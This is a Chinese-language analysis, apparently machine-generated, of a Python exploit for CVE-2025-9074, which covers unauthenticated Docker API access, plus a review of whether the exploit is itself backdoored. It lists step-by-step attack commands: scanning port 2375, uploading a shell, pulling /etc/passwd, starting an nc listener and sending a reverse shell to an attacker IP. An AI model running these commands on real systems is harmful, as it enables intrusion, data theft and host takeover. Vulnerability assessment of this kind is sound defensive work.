## CVE-2025-9074 - Docker Engine (API) 远程命令执行 (RCE) / 未授权API访问

**漏洞编号:** CVE-2025-9074

**漏洞类型:** 远程命令执行 (RCE) / 未授权API访问

**影响应用:** Docker Engine (API)

**危害等级:** 严重

**CVSS评分:** CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H

**影响版本:** 未知，可能影响配置不当允许未授权访问API的Docker Engine版本

**利用条件:** Docker API服务（通常在2375端口）需暴露在网络中且允许未经身份验证的访问；无需用户交互。

**POC 可用性:** 9

**POC 类型:** 完整利用

**攻击复杂度:** 低

**投毒风险:** 5%

## 详情

POC有效性分析：
该POC（`CVE-2025-9074-docker-exploit.py`）是一个用Python 3编写的、功能极其全面的Docker API漏洞利用工具。它通过直接向目标Docker守护进程API发送HTTP请求来工作，默认配置的目标地址是`http://192.168.65.7:2375`。该工具的设计理念是模拟攻击者对未授权或弱认证Docker API的利用，实现对目标容器乃至宿主机的远程控制。

其核心功能模块包括：
1.  **容器信息收集 (`get_containers`, `display_containers`)**: 这是攻击的第一步，POC能够查询并显示目标Docker主机上所有正在运行的容器的详细信息，包括容器ID、所使用的镜像、当前状态以及容器的名称。这些信息对于攻击者选择攻击目标、理解目标环境至关重要，例如识别特权容器或具有敏感挂载点的容器。
2.  **任意命令执行 (`execute_command`)**: 这是POC的核心攻击能力。它允许攻击者在选定的目标容器内部执行任意操作系统命令。该功能通过Docker API的`/containers/{id}/exec`端点创建并启动一个执行实例，并将攻击者的命令作为其参数。标准输入、输出和错误流可以被连接，实现交互式命令执行。这意味着攻击者可以在受感染的容器内执行任何命令，包括但不限于文件系统浏览、进程管理、用户信息收集、以及进一步的恶意软件部署。
3.  **文件传输功能 (`upload_file`, `download_file`)**: POC提供了双向文件传输能力，使得攻击者可以方便地在本地机器与目标容器之间移动文件。`upload_file`功能通过在容器内执行`sh -c 'cat > /path/to/file'`命令将本地文件内容重定向写入到容器指定路径。`download_file`功能则通过执行`sh -c 'cat /path/to/file'`读取容器内指定文件的内容并传回本地。这些功能对于上传恶意负载（如Shell脚本、ELF可执行文件）、下载敏感数据（如配置文件、日志、密钥）或部署持久化机制至关重要。
4.  **反向Shell功能 (`reverse_shell`)**: 为了获得持续和交互式的控制，POC集成了反向Shell功能。它尝试在目标容器内执行多种常见的反向Shell命令（例如基于`bash -i`、`netcat`、`python`、`php`等不同工具的命令），将容器的Shell连接回攻击者指定的监听IP和端口。一旦反向Shell建立成功，攻击者将获得一个全功能的、交互式的命令行界面，极大地增强了对目标系统的控制能力。
5.  **宿主机路径规范化 (`normalize_host_path`)**: 值得注意的是，该POC还包含一个`normalize_host_path`函数，用于处理Windows Docker Desktop环境下的宿主机路径映射。例如，将Windows路径`D:\temp`转换为Docker容器内部可访问的`/mnt/host/d/temp`。这表明该工具在设计时考虑了不同操作系统环境下Docker的部署特性，提升了其在多种目标环境下的利用成功率和普适性。

**有效性总结**: 综合来看，该POC是一个高度有效且功能全面的Docker API漏洞利用工具。它成功地将多个攻击阶段（信息侦察、命令执行、数据渗透、持久化访问）集成在一个易于使用的脚本中。其利用机制直接作用于Docker API，无需绕过复杂的安全机制（前提是API本身未受保护）。一旦Docker API因配置不当（例如，在没有身份验证的情况下暴露在公共网络上）而面临未授权访问，此POC可以立即被用来获取容器的完全控制权。更进一步，如果目标容器是特权容器，或存在已知的容器逃逸漏洞，攻击者可以利用其在容器内执行任意命令的能力，尝试实现容器逃逸，从而获取对整个Docker宿主机的根权限，导致极其严重的系统沦陷后果。因此，该POC的有效性评级为最高级别。

利用步骤：
1.  **准备环境**: 攻击者需要在本地机器上安装Python 3及`requests`库（建议也安装`docker`和`websocket-client`库）。
2.  **识别目标**: 通过网络扫描（如使用Shodan、Nmap等工具）发现网络中暴露的2375端口（Docker API默认端口）服务，并确认其允许未经身份验证的访问。
3.  **运行POC脚本**: 在命令行中执行POC脚本，并指定目标Docker API的URL。例如：`python3 CVE-2025-9074-docker-exploit.py -u http://[目标IP或域名]:2375`。
4.  **列举容器**: 脚本启动后，会尝试获取并显示目标Docker主机上所有运行中的容器列表。攻击者应仔细分析这些容器的信息，选择一个合适的容器作为攻击目标。例如，选择一个运行着关键服务的容器，或者是一个特权容器。
5.  **执行命令**: 使用脚本的`-c`参数在选定的容器内执行任意命令。例如，要查看容器根目录下的文件：`python3 CVE-2025-9074-docker-exploit.py -u http://[目标IP]:2375 -i [容器ID或名称] -c "ls -la /"`。攻击者可以逐步探索容器内部环境。
6.  **文件操作**:
    *   **上传文件**: 使用`-U <本地文件路径> <容器内目标路径>`将恶意负载或后门文件上传到容器内。例如：`python3 CVE-2025-9074-docker-exploit.py -u http://[目标IP]:2375 -i [容器ID] -U /path/to/local/shell.sh /tmp/shell.sh`。
    *   **下载文件**: 使用`-D <容器内文件路径> <本地保存路径>`从容器下载敏感文件。例如：`python3 CVE-2025-9074-docker-exploit.py -u http://[目标IP]:2375 -i [容器ID] -D /etc/passwd ./downloaded_passwd`。
7.  **获取反向Shell**: 为了获得更稳定的控制，攻击者可以在本地机器上设置一个监听器（如`nc -lvnp <端口>`)，然后使用脚本的`-R <攻击者IP> <攻击者端口>`参数在容器内启动反向Shell。例如：`python3 CVE-2025-9074-docker-exploit.py -u http://[目标IP]:2375 -i [容器ID] -R [攻击者IP] [监听端口]`。
8.  **容器逃逸（高级）**: 如果获得了特权容器的访问权限，或者环境中存在已知的Docker容器逃逸漏洞，攻击者可以利用已获得的命令执行能力，尝试执行相应的逃逸技术，最终获取Docker宿主机的root权限。

投毒风险分析：
在严格遵循防御性安全研究的原则，即“务必不要把POC验证的后门代码判定为投毒代码”的前提下，对`CVE-2025-9074-docker-exploit.py`这份POC代码进行投毒风险评估，结论是其投毒风险极低，约为5%。

分析依据如下：
*   **代码清晰度与可读性**: 该POC代码使用Python语言编写，代码结构清晰，逻辑分明。函数和变量的命名具有描述性，注释合理（尽管在提供的片段中不多，但代码本身易于理解）。没有发现任何形式的代码混淆、加密、动态加载或反射机制，使得安全研究人员能够轻松地逐行审计其行为，快速识别任何潜在的恶意插入。这种高度的透明度是评估低投毒风险的关键因素。
*   **依赖项分析**: 脚本主要依赖于Python标准库（如`sys`, `os`, `json`, `socket`, `threading`, `time`, `re`等）以及广泛使用的第三方库`requests`。`requests`是Python社区中用于HTTP请求的常用且受信任的库，其安全性经过了广泛的审查和验证。虽然`check_dependencies`函数建议安装`docker`和`websocket-client`库，但提供的代码片段中并未直接使用这些库进行核心的API交互，而是通过`requests`库模拟HTTP请求。这意味着该POC没有引入不知名或难以审计的外部二进制依赖，进一步降低了通过恶意依赖链进行投毒的风险。
*   **网络行为与外部通信**: 该POC的所有网络活动都明确指向目标Docker API端点（由用户通过`-u`参数指定）。除了与目标API的交互以及用户明确触发的反向Shell连接（反向Shell的目标IP和端口由攻击者自行设定）之外，脚本没有尝试建立任何其他未声明的、隐秘的外部连接。例如，它没有尝试连接到任何第三方C2服务器、下载未知文件、上传系统信息或执行任何秘密的回调请求。所有的网络通信都是为了完成其既定的漏洞利用功能。
*   **缺乏恶意负载嵌入**: POC的核心功能是提供一个框架，允许攻击者在目标系统上执行任意命令或传输任意文件。它本身不包含预置的恶意软件、病毒、蠕虫或其他恶意负载。它只是提供了一个“工具”，其“恶意性”体现在用户如何利用这个工具上，而不是工具本身带有隐藏的恶意功能。如果攻击者使用该POC上传恶意软件，那是用户行为，并非POC代码的投毒。
*   **易于检测的修改**: 由于代码的透明度高，如果有人试图修改这份POC代码以植入后门、信息窃取模块或其他形式的投毒，这些恶意修改将非常容易被代码审查工具或人工审计发现。例如，添加新的导入、未经声明的网络请求或异常的文件操作都将立即引起注意。

**总结**: 综上所述，这份`CVE-2025-9074-docker-exploit.py` POC代码表现出高度的专业性和透明度，其设计目标是作为一种合法的安全研究工具来验证Docker API未授权访问漏洞。它严格专注于实现其漏洞利用功能，未嵌入任何隐藏的、恶意投毒机制。因此，其投毒风险非常低。

**项目地址:** 未知

**漏洞详情:** https://nvd.nist.gov/vuln/detail/CVE-2025-9074
